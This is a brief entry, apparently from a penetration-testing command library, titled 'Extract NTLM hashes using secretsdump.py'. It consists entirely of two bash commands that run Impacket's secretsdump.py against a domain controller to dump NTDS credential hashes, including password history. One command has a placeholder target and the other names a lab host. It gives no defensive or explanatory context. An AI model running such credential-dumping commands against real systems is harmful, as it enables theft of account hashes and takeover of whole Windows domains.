---
id: 5e7ebfd2-ff07-4fc7-a1dd-50a28253c24e
name: Extract NTLM hashes using secretsdump.py
type: command
executor: bash
data: 'python secretsdump.py xxxxxxxxxx -just-dc

  python secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm'
output: null
created_at: '2023-04-06T03:56:08.022970+00:00'
updated_at: '2023-04-10T20:26:32.381858+00:00'
---

# Extract NTLM hashes using secretsdump.py

```bash
python secretsdump.py xxxxxxxxxx -just-dc
python secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm
```
